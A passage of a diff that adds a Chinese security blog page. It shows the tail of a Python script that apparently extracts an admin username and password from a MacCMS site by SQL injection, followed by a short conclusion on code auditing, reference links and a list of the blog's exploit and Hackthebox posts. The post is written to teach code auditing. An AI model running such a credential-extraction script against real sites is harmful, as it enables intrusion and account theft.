+                <span class="n">UserPass</span> <span class="o">+=</span> <span class="n">i</span>
+                <span class="k">break</span>
+    <span class="k">print</span> <span class="s1">&#39;username:&#39;</span><span class="o">+</span><span class="n">UserName</span><span class="p">,</span><span class="s1">&#39;password:&#39;</span><span class="o">+</span><span class="n">UserPass</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div><h1 id="0x07-总结">0x07 总结</h1>
+<p>有时候学习代码审计，不能因为部分的代码没能读懂就不去理会，其实你读的代码越多，做代码审计也越轻松。</p>
+<h1 id="0x08-参考">0x08 参考</h1>
+<p>程序下载：https://www.lanzous.com/i1qm24f
+<a href="http://www.freebuf.com/column/161528.html">http://www.freebuf.com/column/161528.html</a>
+<a href="http://www.mysqltutorial.org/mysql-alias/">http://www.mysqltutorial.org/mysql-alias/</a>
+<a href="http://www.w3school.com.cn/tags/html_ref_urlencode.html">http://www.w3school.com.cn/tags/html_ref_urlencode.html</a>
+<a href="https://github.com/F0r3at/Python-Tools/blob/master/maccms_sql.py">https://github.com/F0r3at/Python-Tools/blob/master/maccms_sql.py</a></p>
+
+    </article>
+
+    
+    <div class="prevnext">
+        
+
+
+
+<ul class="prevnext">
+    
+    <li>上一篇：
+        <a href="https://getshe11.com/post/zen-knowledge-pro-1.6-front-end-arbitrary-file-reading-analysis/">
+            禅知Pro 1.6 前台任意文件读取分析
+        </a>
+    </li>
+    
+    
+    <li>下一篇：
+        <a href="https://getshe11.com/post/yxcms-1.4.7-latest-version-of-vulnerability-analysis/">
+            Yxcms 1.4.7 最新版漏洞分析
+        </a>
+    </li>
+    
+</ul>
+
+    </div>
+    
+    <div class="post-comments">
+        
+  
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="F0r3at/Getshe11.com"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+    </div>
+</div>
+            </div>
+            
+            <div class="col-second">
+                <div class="col-box col-box-author">
+    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
+    <div class="col-box-title name">F0rmat</div>
+    <p>Stay Hungry, Stay Foolish.</p>
+    <p class="contact">
+        <a href="http://github.com/F0r3at">Github</a>
+    </p>
+</div>
+
+<div class="col-box">
+    <div class="col-box-title">Newest Posts</div>
+    <ul class="post-list">
+        
+        <li>
+            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/a-difficult-penetration-process/" class="post-link">一次艰难的渗透提权过程</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/an-app-distribution-system-upload-vulnerability/" class="post-link">某云分发APP上传漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/analysis-of-php-deserialization-vulnerabilities/" class="post-link">浅析PHP反序列化漏洞</a>
+        </li>
+        
+    </ul>
+</div>
+
+<div class="col-box post-toc hide">
+    <div class="col-box-title">TOC</div>
+</div>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="wrapper">
+    © 2021    <a href="https://getshe11.com">F0rmat</a>
+</div>
+    </footer>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>
+
+<script src="/js/easybook.js"></script>
+
+<script src="/js/lazysizes.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
+<script src="/js/figure.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-XXXXXXXX-X', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+</body>
+
+</html>
